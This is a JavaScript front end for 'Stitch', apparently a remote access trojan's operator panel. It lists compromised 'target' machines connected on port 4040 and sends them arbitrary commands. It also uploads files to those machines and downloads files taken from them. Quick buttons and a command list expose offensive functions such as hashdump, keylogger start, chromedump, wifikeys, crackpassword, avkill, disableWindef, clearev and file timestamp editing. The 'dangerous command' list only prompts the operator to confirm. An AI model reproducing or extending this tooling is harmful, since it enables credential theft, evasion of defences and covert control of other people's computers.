// Stitch Real-Time Interface - JavaScript
let socket;
let selectedConnection = null;

// Command history for arrow key navigation
let commandHistory = [];
let historyIndex = -1;
const MAX_HISTORY_SIZE = 50;

// Pagination state
let connectionsPagination = {
    currentPage: 1,
    pageSize: 25,
    totalItems: 0,
    allData: []
};

let filesPagination = {
    currentPage: 1,
    pageSize: 25,
    totalItems: 0,
    allData: []
};

// Dangerous commands that require confirmation
const DANGEROUS_COMMANDS = [
    // Windows Security
    'clearev',
    'avkill',
    'disableRDP',
    'disableUAC',
    'disableWindef',
    'scanreg',
    
    // System Control
    'lockscreen',
    'displayoff',
    'freeze start',
    'freeze',
    'shutdown',
    'reboot',
    
    // Network Modifications
    'hostsfile remove',
    'hostsfile update',
    'firewall close',
    
    // File Operations
    'hide',
    'editaccessed',
    'editcreated',
    'editmodified',
    
    // Security Tools
    'hashdump',
    'keylogger start',
    'chromedump',
    'wifikeys',
    'crackpassword',
    'firewall open',
    'firewall close',
    'hostsfile update',
    'hostsfile remove'
];

// Helper function to check if a command is dangerous
function isDangerousCommand(command) {
    const cmdLower = command.toLowerCase().trim();
    return DANGEROUS_COMMANDS.some(dangerous => cmdLower.startsWith(dangerous.toLowerCase()));
}

// CSRF Token Helper
function getCSRFToken() {
    const metaTag = document.querySelector('meta[name="csrf-token"]');
    return metaTag ? metaTag.getAttribute('content') : '';
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    initializeWebSocket();
    initializeNavigation();
    loadInitialData();
    startAutoRefresh();
    initializeCommandHistory();
    initFileUpload();
});

// WebSocket
function initializeWebSocket() {
    socket = io();
    
    socket.on('connect', () => {
        document.getElementById('serverStatus').classList.add('online');
        document.getElementById('statusText').textContent = 'Connected';
        showToast('Connected to server', 'success');
    });
    
    socket.on('disconnect', () => {
        document.getElementById('serverStatus').classList.remove('online');
        document.getElementById('statusText').textContent = 'Disconnected';
        showToast('Disconnected from server', 'error');
    });
    
    socket.on('debug_log', (log) => {
        appendLog(log);
    });
    
    socket.on('connection_update', (data) => {
        document.getElementById('activeCount').textContent = data.active_connections;
        loadConnections(); // Refresh connections
    });
}

// Navigation
function initializeNavigation() {
    document.querySelectorAll('.nav-link').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const section = link.getAttribute('data-section');
            showSection(section);
        });
    });
}

// Command History Navigation (Arrow Keys)
function initializeCommandHistory() {
    const commandInput = document.getElementById('customCommandInput');
    if (!commandInput) return;
    
    commandInput.addEventListener('keydown', (e) => {
        // Up arrow - navigate to previous command
        if (e.key === 'ArrowUp') {
            e.preventDefault(); // Prevent cursor movement
            
            if (commandHistory.length === 0) return;
            
            // Move back in history
            if (historyIndex > 0) {
                historyIndex--;
            } else {
                historyIndex = 0;
            }
            
            // Set input value to command from history
            commandInput.value = commandHistory[historyIndex];
            
            // Move cursor to end of input
            setTimeout(() => {
                commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length);
            }, 0);
        }
        
        // Down arrow - navigate to next command
        else if (e.key === 'ArrowDown') {
            e.preventDefault(); // Prevent cursor movement
            
            if (commandHistory.length === 0) return;
            
            // Move forward in history
            if (historyIndex < commandHistory.length - 1) {
                historyIndex++;
                commandInput.value = commandHistory[historyIndex];
            } else {
                // At the end of history, clear input
                historyIndex = commandHistory.length;
                commandInput.value = '';
            }
            
            // Move cursor to end of input
            if (commandInput.value) {
                setTimeout(() => {
                    commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length);
                }, 0);
            }
        }
        
        // Enter key - execute command
        else if (e.key === 'Enter') {
            e.preventDefault();
            executeCustomCommand();
        }
    });
}

function showSection(sectionName) {
    // Update nav links
    document.querySelectorAll('.nav-link').forEach(link => {
        link.classList.remove('active');
        if (link.getAttribute('data-section') === sectionName) {
            link.classList.add('active');
        }
    });
    
    // Update sections
    document.querySelectorAll('.content-section').forEach(section => {
        section.classList.remove('active');
    });
    document.getElementById(`${sectionName}-section`).classList.add('active');
    
    // Load data for section
    if (sectionName === 'connections') {
        loadConnections();
        loadServerStatus();
    } else if (sectionName === 'files') {
        loadFiles();
    } else if (sectionName === 'logs') {
        loadLogs();
    }
}

// Load Data
function loadInitialData() {
    loadConnections();
    loadServerStatus();
}

async function loadServerStatus() {
    const loadingIndicator = document.getElementById('statusLoadingIndicator');
    if (loadingIndicator) loadingIndicator.classList.add('show');
    
    try {
        const response = await fetch('/api/server/status');
        const status = await response.json();
        
        document.getElementById('serverListening').textContent = 
            status.listening ? '✅ Listening' : '⚠️ Not Listening';
        document.getElementById('serverPort').textContent = status.port;
        document.getElementById('activeCount').textContent = status.active_connections;
    } catch (error) {
        showToast('Error loading server status', 'error');
    } finally {
        if (loadingIndicator) loadingIndicator.classList.remove('show');
    }
}

async function loadConnections() {
    const loadingIndicator = document.getElementById('connectionsLoadingIndicator');
    if (loadingIndicator) loadingIndicator.classList.add('show');
    
    try {
        const response = await fetch('/api/connections');
        const connections = await response.json();
        
        // Store all data for pagination
        connectionsPagination.allData = connections;
        connectionsPagination.totalItems = connections.length;
        
        // Get paginated data
        const paginatedConnections = paginateData(
            connections, 
            connectionsPagination.currentPage, 
            connectionsPagination.pageSize
        );
        
        const grid = document.getElementById('connectionsGrid');
        
        if (connections.length === 0) {
            grid.innerHTML = `
                <div class="empty-state">
                    <p>🔍 No connections found</p>
                    <p class="help-text">Connections will appear here when devices connect to port 4040</p>
                </div>
            `;
            renderPaginationControls('connectionsPaginationControls', connectionsPagination, 'connections');
            return;
        }
        
        grid.innerHTML = paginatedConnections.map(conn => {
            const isSelected = selectedConnection && selectedConnection.id === conn.id;
            const statusClass = conn.status === 'online' ? 'online' : 'offline';
            const selectedClass = isSelected ? 'selected' : '';
            
            // Format timestamps
            const lastSeen = conn.last_seen !== 'N/A' && conn.last_seen 
                ? new Date(conn.last_seen).toLocaleString() 
                : 'N/A';
            const connectedAt = conn.connected_at !== 'N/A' && conn.connected_at 
                ? new Date(conn.connected_at).toLocaleString() 
                : 'N/A';
            
            const quickActions = conn.status === 'online' ? `
                <div class="quick-actions" onclick="event.stopPropagation();">
                    <button class="quick-btn" onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}'); showSection('commands'); executeCommand('sysinfo');" title="Get full system info">
                        📊 Info
                    </button>
                    <button class="quick-btn" onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}'); showSection('commands'); executeCommand('screenshot');" title="Capture screenshot">
                        📸 Screen
                    </button>
                    <button class="quick-btn" onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}'); showSection('commands'); executeCommand('hashdump');" title="Dump password hashes">
                        🔑 Hashes
                    </button>
                    <button class="quick-btn" onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}'); showSection('commands');" title="Open command panel">
                        ⚡ Commands
                    </button>
                </div>
            ` : '';
            
            return `
                <div class="connection-card ${statusClass} ${selectedClass}" 
                     onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}')">
                    <h3>${conn.hostname}</h3>
                    <div class="connection-info">
                        <p><strong>IP:</strong> ${conn.target}</p>
                        <p><strong>User:</strong> ${conn.user}</p>
                        <p><strong>OS:</strong> ${conn.os}</p>
                        <p><strong>Port:</strong> ${conn.port}</p>
                        <p><strong>Status:</strong> ${conn.status.toUpperCase()}</p>
                        ${conn.status === 'online' ? `<p><strong>Last Seen:</strong> ${lastSeen}</p>` : ''}
                        ${conn.status === 'online' ? `<p><strong>Connected:</strong> ${connectedAt}</p>` : ''}
                    </div>
                    ${quickActions}
                </div>
            `;
        }).join('');
        
        // Render pagination controls
        renderPaginationControls('connectionsPaginationControls', connectionsPagination, 'connections');
        
    } catch (error) {
        showToast('Error loading connections', 'error');
    } finally {
        if (loadingIndicator) loadingIndicator.classList.remove('show');
    }
}

function selectConnection(id, hostname, status) {
    selectedConnection = { id, hostname, status };
    
    // Update UI
    loadConnections(); // Refresh to show selection
    
    // Update command section info
    const infoDiv = document.getElementById('selectedConnectionInfo');
    if (status === 'online') {
        infoDiv.innerHTML = `
            <strong>✅ Selected Target:</strong> ${hostname} (${id}) - ONLINE<br>
            <em>Ready for command execution - Switch to Commands tab</em>
        `;
        infoDiv.style.borderColor = 'var(--success)';
        showToast(`✓ Target selected: ${hostname} - Ready for commands`, 'success');
    } else {
        infoDiv.innerHTML = `
            <strong>⚫ Selected Target:</strong> ${hostname} (${id}) - OFFLINE<br>
            <em>⚠️ This connection is offline. Commands cannot be executed.</em>
        `;
        infoDiv.style.borderColor = 'var(--warning)';
        showToast(`⚠️ ${hostname} is offline - Cannot execute commands`, 'warning');
    }
    
    // Update persistent target indicator in nav
    updateTargetIndicator(hostname, status);
}

function showCommands(category) {
    // Update buttons
    document.querySelectorAll('.cat-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    if (event && event.target) {
        event.target.classList.add('active');
    }
    
    // Update command groups
    document.querySelectorAll('.command-group').forEach(group => {
        group.classList.remove('active');
    });
    const targetGroup = document.getElementById(`${category}Commands`);
    if (targetGroup) {
        targetGroup.classList.add('active');
    }
}

async function executeCommand(command) {
    const outputElem = document.getElementById('commandOutput');
    
    // Check if command is dangerous and require confirmation
    if (isDangerousCommand(command)) {
        const confirmed = confirm(
            `⚠️ WARNING: '${command}' is a destructive command.\n\n` +
            `This action could:\n` +
            `• Disable security features\n` +
            `• Clear system logs\n` +
            `• Disrupt system operations\n` +
            `• Lock the target system\n\n` +
            `Are you sure you want to proceed?`
        );
        
        if (!confirmed) {
            outputElem.textContent = `🚫 Command cancelled by user: ${command}`;
            showToast('Command cancelled', 'warning');
            return;
        }
    }
    
    outputElem.textContent = '⏳ Executing command...\n\n';
    
    try {
        const response = await fetch('/api/execute', {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'X-CSRFToken': getCSRFToken()
            },
            body: JSON.stringify({
                connection_id: selectedConnection ? selectedConnection.id : null,
                command: command
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            outputElem.textContent = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
            outputElem.textContent += `⚡ Command: ${result.command}\n`;
            outputElem.textContent += `🕒 Time: ${new Date(result.timestamp).toLocaleString()}\n`;
            outputElem.textContent += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
            outputElem.textContent += result.output;
            showToast('Command executed', 'success');
        } else {
            outputElem.textContent = `❌ Error: ${result.error}`;
            showToast('Command failed', 'error');
        }
    } catch (error) {
        outputElem.textContent = `❌ Network error: ${error.message}`;
        showToast('Network error', 'error');
    }
}

function executeCommandWithParam(command) {
    const param = prompt(`Enter parameter for ${command}:`);
    if (param) {
        executeCommand(`${command} ${param}`);
    }
}

function executeCustomCommand() {
    const input = document.getElementById('customCommandInput');
    const command = input.value.trim();
    
    // Validation constants
    const MAX_COMMAND_LENGTH = 500;
    const MIN_COMMAND_LENGTH = 1;
    
    // Validate empty command
    if (!command || command.length < MIN_COMMAND_LENGTH) {
        showToast('Please enter a command', 'warning');
        return;
    }
    
    // Validate command length
    if (command.length > MAX_COMMAND_LENGTH) {
        showToast(`Command too long (max ${MAX_COMMAND_LENGTH} characters)`, 'error');
        return;
    }
    
    // Check for dangerous patterns (null bytes, control characters)
    if (/[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]/.test(command)) {
        showToast('Command contains invalid control characters', 'error');
        return;
    }
    
    // Sanitize: remove excessive whitespace
    const sanitizedCommand = command.replace(/\s+/g, ' ').trim();
    
    if (sanitizedCommand) {
        // Add to command history (avoid duplicates of last command)
        if (commandHistory.length === 0 || commandHistory[commandHistory.length - 1] !== sanitizedCommand) {
            commandHistory.push(sanitizedCommand);
            // Limit history size
            if (commandHistory.length > MAX_HISTORY_SIZE) {
                commandHistory.shift();
            }
        }
        // Reset history index
        historyIndex = commandHistory.length;
        
        executeCommand(sanitizedCommand);
        input.value = '';
    } else {
        showToast('Invalid command format', 'warning');
    }
}

function clearOutput() {
    if (confirm('⚠️ Clear all command output?\n\nThis will remove all execution history from the display.')) {
        document.getElementById('commandOutput').textContent = 'Ready to execute commands...';
        showToast('Output cleared', 'info');
    }
}

function clearDebugLogs() {
    if (confirm('⚠️ Clear debug logs?\n\nThis will remove all log entries from the display.')) {
        document.getElementById('debugLogs').innerHTML = '';
        showToast('Logs cleared', 'info');
    }
}

function copyOutput() {
    const outputElem = document.getElementById('commandOutput');
    const text = outputElem.textContent;
    
    if (!text || text === 'Ready to execute commands...') {
        showToast('No output to copy', 'warning');
        return;
    }
    
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text)
            .then(() => {
                showToast('Output copied to clipboard', 'success');
            })
            .catch(err => {
                console.error('Clipboard API failed:', err);
                fallbackCopyToClipboard(text);
            });
    } else {
        fallbackCopyToClipboard(text);
    }
}

function fallbackCopyToClipboard(text) {
    const textArea = document.createElement('textarea');
    textArea.value = text;
    textArea.style.position = 'fixed';
    textArea.style.left = '-999999px';
    textArea.style.top = '-999999px';
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    
    try {
        const successful = document.execCommand('copy');
        if (successful) {
            showToast('Output copied to clipboard', 'success');
        } else {
            showToast('Failed to copy output', 'error');
        }
    } catch (err) {
        console.error('Fallback copy failed:', err);
        showToast('Clipboard access denied', 'error');
    } finally {
        document.body.removeChild(textArea);
    }
}

async function loadFiles() {
    const loadingIndicator = document.getElementById('filesLoadingIndicator');
    if (loadingIndicator) loadingIndicator.classList.add('show');
    
    try {
        const response = await fetch('/api/files/downloads');
        const files = await response.json();
        
        // Store all data for pagination
        filesPagination.allData = files;
        filesPagination.totalItems = files.length;
        
        // Get paginated data
        const paginatedFiles = paginateData(
            files,
            filesPagination.currentPage,
            filesPagination.pageSize
        );
        
        const grid = document.getElementById('filesGrid');
        
        if (files.length === 0) {
            grid.innerHTML = `
                <div class="empty-state">
                    <p>📁 No files found</p>
                    <p class="help-text">Downloaded files will appear here</p>
                </div>
            `;
            renderPaginationControls('filesPaginationControls', filesPagination, 'files');
            return;
        }
        
        grid.innerHTML = paginatedFiles.map(file => `
            <div class="file-item">
                <div class="file-info">
                    <div class="file-name">📄 ${file.name}</div>
                    <div class="file-details">
                        Size: ${formatBytes(file.size)} | Modified: ${new Date(file.modified).toLocaleString()}
                    </div>
                </div>
                <a href="/api/files/download/${encodeURIComponent(file.path)}" 
                   class="download-btn">Download</a>
            </div>
        `).join('');
        
        // Render pagination controls
        renderPaginationControls('filesPaginationControls', filesPagination, 'files');
        
    } catch (error) {
        showToast('Error loading files', 'error');
    } finally {
        if (loadingIndicator) loadingIndicator.classList.remove('show');
    }
}

async function loadLogs() {
    const loadingIndicator = document.getElementById('logsLoadingIndicator');
    if (loadingIndicator) loadingIndicator.classList.add('show');
    
    try {
        const response = await fetch('/api/debug/logs?limit=100');
        const logs = await response.json();
        
        const logsDiv = document.getElementById('debugLogs');
        logsDiv.innerHTML = logs.map(log => 
            `<div class="log-entry ${log.level}">[${log.timestamp}] [${log.level}] ${log.message}</div>`
        ).join('');
        
        // Auto-scroll to bottom
        logsDiv.scrollTop = logsDiv.scrollHeight;
        
    } catch (error) {
        showToast('Error loading logs', 'error');
    } finally {
        if (loadingIndicator) loadingIndicator.classList.remove('show');
    }
}

function appendLog(log) {
    const logsDiv = document.getElementById('debugLogs');
    const logEntry = document.createElement('div');
    logEntry.className = `log-entry ${log.level}`;
    logEntry.textContent = `[${log.timestamp}] [${log.level}] ${log.message}`;
    logsDiv.appendChild(logEntry);
    
    // Auto-scroll
    logsDiv.scrollTop = logsDiv.scrollHeight;
}

// Auto-refresh
function startAutoRefresh() {
    setInterval(() => {
        const activeSection = document.querySelector('.content-section.active').id;
        
        if (activeSection === 'connections-section') {
            loadConnections();
            loadServerStatus();
        } else if (activeSection === 'logs-section') {
            loadLogs();
        }
    }, 5000); // Refresh every 5 seconds
}

// Toast Notifications
function showToast(message, type = 'info') {
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    
    container.appendChild(toast);
    
    setTimeout(() => {
        toast.remove();
    }, 3000);
}

// Utilities
function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
}

// Export Functions
async function exportLogs(format) {
    try {
        const response = await fetch(`/api/export/logs?format=${format}`);
        if (!response.ok) throw new Error('Export failed');
        
        const blob = await response.blob();
        const filename = `stitch_logs_${new Date().toISOString().slice(0,19).replace(/:/g,'-')}.${format}`;
        downloadBlob(blob, filename);
        
        showToast(`Logs exported as ${format.toUpperCase()}`, 'success');
    } catch (error) {
        showToast('Failed to export logs', 'error');
        console.error('Export error:', error);
    }
}

async function exportCommandHistory(format) {
    try {
        const response = await fetch(`/api/export/commands?format=${format}`);
        if (!response.ok) throw new Error('Export failed');
        
        const blob = await response.blob();
        const filename = `stitch_commands_${new Date().toISOString().slice(0,19).replace(/:/g,'-')}.${format}`;
        downloadBlob(blob, filename);
        
        showToast(`Command history exported as ${format.toUpperCase()}`, 'success');
    } catch (error) {
        showToast('Failed to export command history', 'error');
        console.error('Export error:', error);
    }
}

function downloadBlob(blob, filename) {
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);
}

// Search and Filter Functions
function filterConnections() {
    const searchTerm = document.getElementById('connectionsSearch').value.toLowerCase();
    const statusFilter = document.getElementById('connectionsFilter').value;
    const cards = document.querySelectorAll('.connection-card');
    
    let visibleCount = 0;
    
    cards.forEach(card => {
        const text = card.textContent.toLowerCase();
        const isOnline = card.classList.contains('online');
        const status = isOnline ? 'online' : 'offline';
        
        const matchesSearch = text.includes(searchTerm);
        const matchesFilter = statusFilter === 'all' || status === statusFilter;
        
        if (matchesSearch && matchesFilter) {
            card.style.display = 'block';
            visibleCount++;
        } else {
            card.style.display = 'none';
        }
    });
    
    // Show "no results" message if nothing visible
    if (visibleCount === 0 && cards.length > 0) {
        showNoResultsMessage('connectionsGrid', 'No connections match your search/filter');
    } else {
        removeNoResultsMessage('connectionsGrid');
    }
}

function filterFiles() {
    const searchTerm = document.getElementById('filesSearch').value.toLowerCase();
    const cards = document.querySelectorAll('.file-card');
    
    let visibleCount = 0;
    
    cards.forEach(card => {
        const text = card.textContent.toLowerCase();
        
        if (text.includes(searchTerm)) {
            card.style.display = 'block';
            visibleCount++;
        } else {
            card.style.display = 'none';
        }
    });
    
    // Show "no results" message if nothing visible
    if (visibleCount === 0 && cards.length > 0) {
        showNoResultsMessage('filesGrid', 'No files match your search');
    } else {
        removeNoResultsMessage('filesGrid');
    }
}

function showNoResultsMessage(containerId, message) {
    const container = document.getElementById(containerId);
    let noResultsDiv = container.querySelector('.no-results-message');
    
    if (!noResultsDiv) {
        noResultsDiv = document.createElement('div');
        noResultsDiv.className = 'no-results-message';
        noResultsDiv.innerHTML = `<p>🔍 ${message}</p>`;
        container.appendChild(noResultsDiv);
    }
}

function removeNoResultsMessage(containerId) {
    const container = document.getElementById(containerId);
    const noResultsDiv = container.querySelector('.no-results-message');
    if (noResultsDiv) {
        noResultsDiv.remove();
    }
}

// File Upload Functions
let selectedFile = null;

function initFileUpload() {
    const uploadZone = document.getElementById('uploadZone');
    const fileInput = document.getElementById('fileInput');
    
    // Click to select file
    uploadZone.addEventListener('click', () => {
        fileInput.click();
    });
    
    // File selected
    fileInput.addEventListener('change', (e) => {
        handleFileSelect(e.target.files[0]);
    });
    
    // Drag and drop
    uploadZone.addEventListener('dragover', (e) => {
        e.preventDefault();
        uploadZone.classList.add('drag-over');
    });
    
    uploadZone.addEventListener('dragleave', () => {
        uploadZone.classList.remove('drag-over');
    });
    
    uploadZone.addEventListener('drop', (e) => {
        e.preventDefault();
        uploadZone.classList.remove('drag-over');
        
        if (e.dataTransfer.files.length > 0) {
            handleFileSelect(e.dataTransfer.files[0]);
        }
    });
}

function handleFileSelect(file) {
    if (!file) return;
    
    // Check file size (100MB limit)
    const maxSize = 100 * 1024 * 1024;
    if (file.size > maxSize) {
        showToast('File is too large. Maximum size is 100MB', 'error');
        return;
    }
    
    selectedFile = file;
    
    // Show file info
    document.getElementById('fileName').textContent = file.name;
    document.getElementById('fileSize').textContent = formatBytes(file.size);
    document.getElementById('uploadZone').style.display = 'none';
    document.getElementById('uploadInfo').style.display = 'block';
}

function cancelUpload() {
    selectedFile = null;
    document.getElementById('uploadZone').style.display = 'block';
    document.getElementById('uploadInfo').style.display = 'none';
    document.getElementById('uploadProgress').style.display = 'none';
    document.getElementById('fileInput').value = '';
}

async function uploadFile() {
    if (!selectedFile) {
        showToast('No file selected', 'error');
        return;
    }
    
    if (!selectedConnection) {
        showToast('No target connection selected', 'error');
        return;
    }
    
    // Show progress
    document.getElementById('uploadInfo').style.display = 'none';
    document.getElementById('uploadProgress').style.display = 'block';
    
    try {
        const formData = new FormData();
        formData.append('file', selectedFile);
        formData.append('target_id', selectedConnection.id);
        
        const xhr = new XMLHttpRequest();
        
        xhr.upload.addEventListener('progress', (e) => {
            if (e.lengthComputable) {
                const percent = Math.round((e.loaded / e.total) * 100);
                document.getElementById('progressFill').style.width = percent + '%';
                document.getElementById('progressText').textContent = `Uploading... ${percent}%`;
            }
        });
        
        xhr.addEventListener('load', () => {
            if (xhr.status === 200) {
                const response = JSON.parse(xhr.responseText);
                showToast('File uploaded successfully!', 'success');
                cancelUpload();
                
                // Show result in command output
                if (response.output) {
                    const outputElem = document.getElementById('commandOutput');
                    outputElem.textContent = response.output + '\n' + (outputElem.textContent || '');
                }
            } else {
                const error = JSON.parse(xhr.responseText);
                showToast(error.error || 'Upload failed', 'error');
                cancelUpload();
            }
        });
        
        xhr.addEventListener('error', () => {
            showToast('Upload failed - network error', 'error');
            cancelUpload();
        });
        
        xhr.open('POST', '/api/upload', true);
        // Include CSRF token header for Flask-WTF
        const csrfMeta = document.querySelector('meta[name="csrf-token"]');
        if (csrfMeta) {
            xhr.setRequestHeader('X-CSRFToken', csrfMeta.getAttribute('content'));
        }
        xhr.send(formData);
        
    } catch (error) {
        console.error('Upload error:', error);
        showToast('Upload failed: ' + error.message, 'error');
        cancelUpload();
    }
}

// ============================================
// Pagination Functions
// ============================================

function paginateData(data, page, pageSize) {
    const start = (page - 1) * pageSize;
    const end = start + pageSize;
    return data.slice(start, end);
}

function getTotalPages(totalItems, pageSize) {
    return Math.ceil(totalItems / pageSize) || 1;
}

function renderPaginationControls(containerId, paginationState, loadFunction) {
    const container = document.getElementById(containerId);
    if (!container) return;
    
    const totalPages = getTotalPages(paginationState.totalItems, paginationState.pageSize);
    const currentPage = paginationState.currentPage;
    
    if (paginationState.totalItems === 0) {
        container.innerHTML = '';
        return;
    }
    
    const start = (currentPage - 1) * paginationState.pageSize + 1;
    const end = Math.min(currentPage * paginationState.pageSize, paginationState.totalItems);
    
    container.innerHTML = `
        <div class="pagination-controls">
            <div class="pagination-info">
                Showing ${start}-${end} of ${paginationState.totalItems}
            </div>
            <div class="pagination-buttons">
                <button onclick="changePage('${loadFunction}', 1)" 
                        ${currentPage === 1 ? 'disabled' : ''}>
                    ⏮️ First
                </button>
                <button onclick="changePage('${loadFunction}', ${currentPage - 1})" 
                        ${currentPage === 1 ? 'disabled' : ''}>
                    ◀️ Prev
                </button>
                <span class="page-number">Page ${currentPage} of ${totalPages}</span>
                <button onclick="changePage('${loadFunction}', ${currentPage + 1})" 
                        ${currentPage === totalPages ? 'disabled' : ''}>
                    Next ▶️
                </button>
                <button onclick="changePage('${loadFunction}', ${totalPages})" 
                        ${currentPage === totalPages ? 'disabled' : ''}>
                    Last ⏭️
                </button>
            </div>
            <div class="pagination-size">
                <label>Per page:</label>
                <select onchange="changePageSize('${loadFunction}', this.value)">
                    <option value="10" ${paginationState.pageSize === 10 ? 'selected' : ''}>10</option>
                    <option value="25" ${paginationState.pageSize === 25 ? 'selected' : ''}>25</option>
                    <option value="50" ${paginationState.pageSize === 50 ? 'selected' : ''}>50</option>
                    <option value="100" ${paginationState.pageSize === 100 ? 'selected' : ''}>100</option>
                </select>
            </div>
        </div>
    `;
}

function changePage(loadFunction, newPage) {
    if (loadFunction === 'connections') {
        connectionsPagination.currentPage = newPage;
        loadConnections();
    } else if (loadFunction === 'files') {
        filesPagination.currentPage = newPage;
        loadFiles();
    }
}

function changePageSize(loadFunction, newSize) {
    if (loadFunction === 'connections') {
        connectionsPagination.pageSize = parseInt(newSize);
        connectionsPagination.currentPage = 1;
        loadConnections();
    } else if (loadFunction === 'files') {
        filesPagination.pageSize = parseInt(newSize);
        filesPagination.currentPage = 1;
        loadFiles();
    }
}

// Update persistent target indicator in navigation
function updateTargetIndicator(hostname, status) {
    let indicator = document.getElementById('targetIndicator');
    if (!indicator) {
        // Create indicator if it doesn't exist
        const sidebar = document.querySelector('.sidebar-footer');
        indicator = document.createElement('div');
        indicator.id = 'targetIndicator';
        indicator.className = 'target-indicator';
        sidebar.insertBefore(indicator, sidebar.firstChild);
    }
    
    const statusIcon = status === 'online' ? '🎯' : '⚫';
    const statusClass = status === 'online' ? 'online' : 'offline';
    indicator.className = `target-indicator ${statusClass}`;
    indicator.innerHTML = `
        <div class="indicator-label">ACTIVE TARGET</div>
        <div class="indicator-value">${statusIcon} ${hostname}</div>
    `;
}
